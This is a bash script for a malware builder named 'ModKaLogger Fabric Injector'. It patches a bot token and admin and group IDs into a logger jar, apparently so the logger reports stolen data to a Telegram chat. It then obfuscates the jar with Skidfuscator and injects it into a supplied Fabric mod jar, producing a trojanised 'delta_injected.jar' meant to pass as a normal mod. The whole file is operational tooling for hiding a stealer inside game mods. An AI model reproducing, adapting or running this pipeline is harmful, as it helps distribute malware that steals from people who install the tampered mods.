#!/bin/bash
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

JAVASSIST_JAR="$SCRIPT_DIR/../libs/javassist.jar"
RT_JAR="/opt/jdk8u422-b05/jre/lib/rt.jar"
LIBS_DIR="$SCRIPT_DIR/libs_runtime"
MOD_JAR="modkalogger-fabric-1.0.0.jar"
OBF_JAR="build/libs/modkalogger-obf.jar"

INPUT="$1"
OUTPUT="$2"
if [ -z "$OUTPUT" ]; then OUTPUT="delta_injected.jar"; fi
BOT_TOKEN="$3"
ADMIN_ID="$4"
GROUP_ID="$5"

echo "============================================"
echo "  ModKaLogger Fabric Injector v4.2 Linux"
echo "============================================"
if [ -z "$GROUP_ID" ]; then
    echo "[i] group_id not provided - sending to personal chat only"
fi
echo "Input:  $INPUT"
echo "Output: $OUTPUT"
echo ""

echo "[1/5] Checking modkalogger jar..."
rm -f "$OBF_JAR"
if [ ! -f "$MOD_JAR" ]; then
    echo "[ERROR] $MOD_JAR not found"
    exit 1
fi
echo "[OK] Using pre-built $MOD_JAR"
echo ""

echo "[2/5] Injecting token/admin/group into CoreBootstrap..."
javac -encoding UTF-8 -cp "$JAVASSIST_JAR" TokenPatcher.java 2>/dev/null
java -cp ".:$JAVASSIST_JAR" TokenPatcher "$MOD_JAR" "$BOT_TOKEN" "$ADMIN_ID" "$GROUP_ID" "$MOD_JAR.patched"
if [ ! -f "$MOD_JAR.patched" ]; then
    echo "[ERROR] TokenPatch failed"
    exit 1
fi
mv -f "$MOD_JAR.patched" "$MOD_JAR"
echo ""

echo "[3/5] Obfuscating with Skidfuscator..."
JAVA8="/opt/jdk8u422-b05/bin/java"
if [ -f "$JAVA8" ] && [ -f "$RT_JAR" ]; then
    "$JAVA8" -jar skidfuscator.jar obfuscate "$MOD_JAR" -o "$OBF_JAR" -rt "$RT_JAR" -notrack 2>&1 | tail -5
    if [ -f "$OBF_JAR" ]; then
        echo "[OK] Obfuscated -> $OBF_JAR"
    else
        echo "[WARN] Obfuscation failed, using unobfuscated jar"
        OBF_JAR="$MOD_JAR"
    fi
else
    echo "[WARN] JDK 8 or rt.jar not found, skipping obfuscation"
    OBF_JAR="$MOD_JAR"
fi
echo ""

echo "[4/5] Compiling FabricInjector + MixinFixer..."
javac -encoding UTF-8 -cp "$JAVASSIST_JAR" FabricInjector.java MixinFixer.java 2>/dev/null
echo ""

echo "[5/5] Injecting obfuscated mod into $INPUT..."
java -cp ".:$JAVASSIST_JAR" FabricInjector "$INPUT" "$OUTPUT" "$OBF_JAR"

java -cp ".:$JAVASSIST_JAR" MixinFixer "$OUTPUT"
echo ""
echo "[+] DONE: $OUTPUT"
